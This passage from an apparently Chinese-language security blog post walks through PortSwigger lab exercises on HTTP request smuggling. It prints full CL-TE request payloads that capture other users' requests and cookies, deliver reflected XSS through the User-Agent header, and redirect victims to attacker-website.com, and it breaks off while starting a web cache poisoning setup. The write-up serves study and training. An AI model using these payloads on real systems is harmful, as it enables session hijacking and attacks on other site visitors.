字段的话，需要在最后添加一个<code>\r\n</code>，否则会返回 400 。</p><h3 id="Capturing-other-users’-requests"><a href="#Capturing-other-users’-requests" class="headerlink" title="Capturing other users’ requests"></a>Capturing other users’ requests</h3><p>既然能拿到中间件请求，当然我们也可以尝试去拿其他用户的请求，也能拿到 Cookie 等，LAB 地址：<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-capture-other-users-requests" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to capture other users’ requests</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to be stored in the application. Then retrieve the next user’s request and use the victim user’s cookies to access their account.</p></blockquote><p>原理也比较简单，我们可以找到一个发评论的地方，然后利用评论处进行 HTTP Smuggling，例如，我们可以构造以下请求包：</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac951f7d1e9ea625803c617f003f005c.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 271</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 600</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=ipRivKyVnK41ZGBQk7JvtKjbD4drk2At</span><br><span class="line"></span><br><span class="line">csrf=oIjWmI8aLjIzqX18n5mNCnJieTnOVWPN&amp;postId=5&amp;name=1&amp;email=1%40qq.com&amp;website=http%3A%2F%2Fwww.baidu.com&amp;comment=1</span><br></pre></td></tr></tbody></table></figure><p></p><p>只要下面这个 CL 足够大，我们就可以用 HTTP Smuggling 把下一个用户的请求拼接到我们最后一个 comment 参数里面了，然后我们在看评论处就可以看到别人的请求头了。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124213544.png" alt=""></p><h3 id="Exploit-Reflected-XSS"><a href="#Exploit-Reflected-XSS" class="headerlink" title="Exploit Reflected XSS"></a>Exploit Reflected XSS</h3><p>这个利用场景可能比较受限，也比较少见，但是如果存在 HTTP Smuggling &amp; reflected XSS ，我们就可以利用这个组合拳 X 到别人的 cookie</p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding.</p><p>The application is also vulnerable to <a href="https://portswigger.net/web-security/cross-site-scripting/reflected" target="_blank" rel="noopener">reflected XSS</a> via the User-Agent header.</p><p>To solve the lab, smuggle a request to the back-end server that causes the next user’s request to receive a response containing an XSS exploit that executes alert(1).</p></blockquote><p>还是依旧的 CL-TE 场景，我们可以在 UA 处发现有一个反射 XSS，but 单是这样没什么用，所以我们得想点办法升级危害。</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191124235543.png" alt=""></p><p>我们可以构造以下数据包，只要发送一次</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: ac811f011e27d43b80301693005a0007.web-security-academy.net</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Connection</span>: close</span><br><span class="line"><span class="hljs-attribute">Cookie</span>: session=iSxMvTrkiVN2G5N7EF7MTKgXGRE6A5xZ</span><br><span class="line"><span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 150</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: "&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后我们随便访问该站任何页面都会被弹窗了，因为我们的请求被嵌入到了上面的第二个请求当中：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125000410.png" alt=""></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191125001149.png" alt=""></p><h3 id="Turn-An-On-Site-Redirect-Into-An-Open-Redirect"><a href="#Turn-An-On-Site-Redirect-Into-An-Open-Redirect" class="headerlink" title="Turn An On-Site Redirect Into An Open Redirect"></a>Turn An On-Site Redirect Into An Open Redirect</h3><p>这种攻击场景是在目标在使用 30x 跳转的时候，使用了 Host 头进行跳转，例如在 Apache &amp; IIS 服务器上，一个uri 最后不带 / 的请求会被 30x 导向带 / 的地址，例如发送以下请求：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: normal-website.com</span><br></pre></td></tr></tbody></table></figure><p></p><p>我们会得到 Response :</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://normal-website.com/home/</span><br></pre></td></tr></tbody></table></figure><p></p><p>看起来没什么危害，但是如果我们配合 HTTP Smuggling 就会有问题了，例如：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 54</span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">0</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line">GET /home HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: X</span><br></pre></td></tr></tbody></table></figure><p></p><p>Smugle 之后的请求会像以下这样：</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/home</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: attacker-website.com</span><br><span class="line"><span class="hljs-attribute">Foo</span>: XGET /scripts/include.js HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: vulnerable-website.com</span><br></pre></td></tr></tbody></table></figure><p></p><p>然后如果服务器根据 Host 进行跳转的话，我们会得到以下的 Response:</p><p></p><figure class="highlight http hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="hljs-number">301</span> Moved Permanently</span><br><span class="line"><span class="hljs-attribute">Location</span>: https://attacker-website.com/home/</span><br></pre></td></tr></tbody></table></figure><p></p><p>这样，受害者，也就是访问<code>/scripts/include.js</code>这个的用户，会被跳转到我们控制的 url 了。</p><h3 id="Perform-Web-Cache-Poisoning"><a href="#Perform-Web-Cache-Poisoning" class="headerlink" title="Perform Web Cache Poisoning"></a>Perform Web Cache Poisoning</h3><p>这个场景也是基于上面的 Host 跳转的攻击场景，如果 Front 服务器还存在缓存静态资源的话，我们可以配合 HTTP Smuggling 进行缓存投毒，<a href="https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-poisoning" target="_blank" rel="noopener">Lab: Exploiting HTTP request smuggling to perform web cache poisoning</a></p><blockquote><p>This lab involves a front-end and back-end server, and the front-end server doesn’t support chunked encoding. The front-end server is configured to cache certain responses.</p><p>To solve the lab, perform a <a href="https://portswigger.net/web-security/request-smuggling" target="_blank" rel="noopener">request smuggling</a> attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server.</p></blockquote><p>这个环境也是一个可以修改 Host 进行跳转的场景，而在<code>/post/next?postId=2</code>路由正好有一个跳转的 api 供我们使用，这个路由跳转到的是<code>/post?postId=4</code>。</p><p>根据题目描述，我们需要实现缓存投毒， 例如这里我们就选择<code>/resources/js/tracking.js</code>进行投毒，LAB 还给了我们制造投毒的服务，于是我们可以进行以下设置：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41p